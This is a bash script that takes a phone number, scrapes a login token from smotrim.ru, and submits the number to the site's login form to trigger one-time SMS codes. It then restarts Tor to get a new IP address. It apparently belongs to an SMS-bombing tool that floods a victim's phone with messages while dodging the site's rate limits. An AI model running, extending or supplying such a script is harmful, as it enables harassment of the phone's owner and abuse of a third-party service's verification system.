#!/bin/bash
PHONE="$1"
echo "$PHONE"

TOKEN=$(curl -v -s -m 2 'https://smotrim.ru/personal/login?redirect=%2F' \
          -H 'Connection: keep-alive' \
          -H 'Pragma: no-cache' \
          -H 'Cache-Control: no-cache' \
          -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
          -H 'DNT: 1' \
          -H 'X-Requested-With: XMLHttpRequest' \
          -H 'sec-ch-ua-mobile: ?0' \
          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.37' \
          -H 'sec-ch-ua-platform: "Windows"' \
          -H 'Accept: */*' \
          -H 'Sec-Fetch-Site: same-origin' \
          -H 'Sec-Fetch-Mode: same-origin' \
          -H 'Sec-Fetch-Dest: empty' \
          -H 'Referer: https://smotrim.ru/' \
          -H 'Accept-Language: ru-UA,ru;q=0.9' \
          --compressed | grep _token | sed -E 's/.*_token" value="([^"]+).*/\1/')

#sleep 1

curl -v -s -m 2 'https://smotrim.ru/personal/login?redirect=%2F' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
  -H 'DNT: 1' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5SwmTu1NI6j42B5o' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.37' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'Accept: */*' \
  -H 'Origin: https://smotrim.ru' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: same-origin' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: ru-UA,ru;q=0.9' \
  --data-raw $'------WebKitFormBoundary5SwmTu1NI6j42B5o\r\nContent-Disposition: form-data; name="phone"\r\n\r\n'"$PHONE"$'\r\n------WebKitFormBoundary5SwmTu1NI6j42B5o\r\nContent-Disposition: form-data; name="_token"\r\n\r\n'"s$TOKEN"$'\r\n------WebKitFormBoundary5SwmTu1NI6j42B5o--\r\n' \
  --compressed
  #| grep 'one-time-code' | if [ "$(wc -l)" = "0" ]; then echo "fail"; else echo "ok"; fi;


pkill -sighup tor 2>/dev/null
